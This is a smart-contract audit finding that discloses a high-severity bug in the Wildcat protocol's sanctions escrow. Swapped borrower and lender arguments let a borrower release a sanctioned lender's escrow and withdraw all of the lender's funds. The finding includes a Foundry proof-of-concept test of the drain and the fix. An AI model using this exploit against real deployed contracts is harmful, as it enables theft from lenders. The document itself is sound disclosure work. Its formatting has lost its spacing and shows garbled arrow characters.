@@ -1,0 +1,41 @@
+[H-06] Borrower can drain all funds of a sanctioned lender
+Submitted byYusSecurity, also found byd3e4,serial-coder,nirlin,xeros,VAD37,DeFiHackLabs,0xKbl,0xDING99YA,Aymen0909,ast3ros,Yanchuan,MiloTruck,AS,sl1,QiuhaoLi,gizzy,SovaSlava,TrungOre,cartlex_,kodyvim,Vagner,KeyKiril,GREY-HAWK-REACH,0xSwahili,ggg_ttt_hhh,3docSec,Silvermist,0xbepresent,tallo,ZdravkoHr,0xCiphky,rvierdiiev,nobody2018,deth, and0xAsen
+Lines of code
+https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/WildcatSanctionsSentinel.sol#L96-L97https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketBase.sol#L173-L174https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L166-L170
+Impact
+TheWildcatMarketBase#_blockAccount()function that is used to block a sanctioned lender contains a critical bug. It incorrectly callsIWildcatSanctionsSentinel(sentinel).createEscrow()with misordered arguments, accidentally creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.
+The execution of withdrawals (WildcatMarketWithdrawals#executeWithdrawal()) also performs a check if theaccountAddressis sanctioned and if it is, then escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with theaccountandborrowerarguments in the wrong order.
+That means whether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.
+Proof of Concept
+Consider this scenario to illustrate how the issue can be exploited:
+Bob The Borrower creates a market.Bob authorizes Larry The Lender as a lender in the created market.Larry deposits funds into the market.Larry gets sanctioned in Chainalysis.Bob invokesWildcatMarket#nukeFromOrbit(larryAddress), blocking Larry and creating a vulnerableWildcatSanctionsEscrowwhere Larry’s market tokens are transferred.Bob authorizes himself as a lender in the market viaWildcatMarketController#authorizeLenders(bobAddress).Bob initiates a withdrawal usingWildcatMarket#queueWithdrawal().After the withdrawal batch duration expires, Bob callsWildcatMarket#executeWithdrawal()and gains access to all of Larry’s assets.
+Now, let’s delve into the specifics and mechanics of the vulnerability:
+ThenukeFromOrbit()function calls_blockAccount(state, larryAddress), blocking Larry’s account, creating an escrow, and transferring his market tokens to that escrow.
+//@audit                                                     Larry//@audit                                                       â†“function_blockAccount(MarketStatememorystate,addressaccountAddress)internal{Accountmemoryaccount=_accounts[accountAddress];// ...account.approval=AuthRole.Blocked;// ...account.scaledBalance=0;addressescrow=IWildcatSanctionsSentinel(sentinel).createEscrow(accountAddress,//@audit â† Larryborrower,//@audit â† Bobaddress(this));// ..._accounts[escrow].scaledBalance+=scaledBalance;// ...}
+In the code snippet, notice the order of arguments passed tocreateEscrow():
+createEscrow(accountAddress,borrower,address(this));
+However, when we examine theWildcatSanctionsSentinel#createEscrow()implementation, we see a different order of arguments. This results in an incorrect construction oftmpEscrowParams:
+functioncreateEscrow(addressborrower,//@audit â† Larryaddressaccount,//@audit â† Bobaddressasset)publicoverridereturns(addressescrowContract) {// ...// @audit                        ( Larry  ,   Bob  , asset)// @audit                            â†“         â†“       â†“tmpEscrowParams=TmpEscrowParams(borrower,account,asset);newWildcatSanctionsEscrow{salt:keccak256(abi.encode(borrower,account,asset)) }();// ...}
+ThetmpEscrowParamsare essential for setting up the escrow correctly. They are fetched in the constructor ofWildcatSanctionsEscrow, and the order of these parameters is significant:
+constructor() {sentinel=msg.sender;(borrower,account,asset) =WildcatSanctionsSentinel(sentinel).tmpEscrowParams();//     â†‘        â†‘       â†‘//(  Larry ,   Bob  , asset) are the params fetched here. @audit}
+However, due to the misordered arguments in_blockAccount(), what’s passed astmpEscrowParamsis(borrower = Larry, account = Bob, asset), which is incorrect. This misordering affects thecanReleaseEscrow()function, which determines whetherreleaseEscrow()should proceed or revert.
+functioncanReleaseEscrow()publicviewoverridereturns(bool) {//@audit                                                 Larry      Bob//                                                         â†“         â†“return!WildcatSanctionsSentinel(sentinel).isSanctioned(borrower,account);}
+The misordered parameters impact the return value ofsentinel.isSanctioned(). It mistakenly checks Bob against the sanctions list, where he is not sanctioned.
+//@audit                       Larry              Bob//                               â†“                 â†“functionisSanctioned(addressborrower,addressaccount)publicviewoverridereturns(bool) {return!sanctionOverrides[borrower][account] &&// trueIChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account);// false}
+ThusisSanctioned()returnsfalseand consequentlycanReleaseEscrow()returnstrue. This allows Bob to successfully executereleaseEscrow()and drain all of Larry’s market tokens:
+functionreleaseEscrow()publicoverride{if(!canReleaseEscrow())revertCanNotReleaseEscrow();uint256amount=balance();//@audit                 Bob   Larry's $//                        â†“       â†“IERC20(asset).transfer(account,amount);emitEscrowReleased(account,asset,amount);}
+After this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.
+Below is a PoC demonstrating how to execute the exploit. To proceed, please include the following import statements intest/market/WildcatMarketConfig.t.sol:
+import'src/WildcatSanctionsEscrow.sol';import"forge-std/console2.sol";
+Add the following testtest/market/WildcatMarketConfig.t.solas well:
+functiontest_borrowerCanStealSanctionedLendersFunds()external{vm.label(borrower,"bob");// Label borrower for better trace readability// This is Larry The Lenderaddresslarry=makeAddr("larry");// Larry deposists 10e18 into Bob's market_deposit(larry,10e18);// Larry's been a bad guy and gets sanctionedsanctionsSentinel.sanction(larry);// Larry gets nuked by the borrowervm.prank(borrower);market.nukeFromOrbit(larry);// The vulnerable escrow in which Larry's funds get movedaddressvulnerableEscrow=sanctionsSentinel.getEscrowAddress(larry,borrower,address(market));vm.label(vulnerableEscrow,"vulnerableEscrow");// Ensure Larry's funds have been moved to his escrowassertEq(market.balanceOf(larry),0);assertEq(market.balanceOf(vulnerableEscrow),10e18);// Malicious borrower is able to release the escrow due to the vulnerabilityvm.prank(borrower);WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();// Malicious borrower has all of Larry's tokensassertEq(market.balanceOf(borrower),10e18);// The borrower authorizes himself as a lender in the market_authorizeLender(borrower);// Queue withdrawal of all fundsvm.prank(borrower);market.queueWithdrawal(10e18);// Fast-forward to when the batch duration expiresfastForward(parameters.withdrawalBatchDuration);uint32expiry=uint32(block.timestamp);// Execute the withdrawalmarket.executeWithdrawal(borrower,expiry);// Assert the borrower has drained all of Larry's assetsassertEq(asset.balanceOf(borrower),10e18);}
+Run the PoC like this:
+forgetest--match-test test_borrowerCanStealSanctionedLendersFunds -vvvv
+Recommended Mitigation Steps
+Fix the order of parameters inWildcatSanctionsSentinel#createEscrow(borrower, account, asset):
+function createEscrow(-   address borrower,+   address account,-   address account,+   address borrower,address asset) public override returns (address escrowContract) {
+Assessed type
+Error
+laurenceday (Wildcat) commented:
+Mitigatedhere.
+laurenceday (Wildcat) confirmed
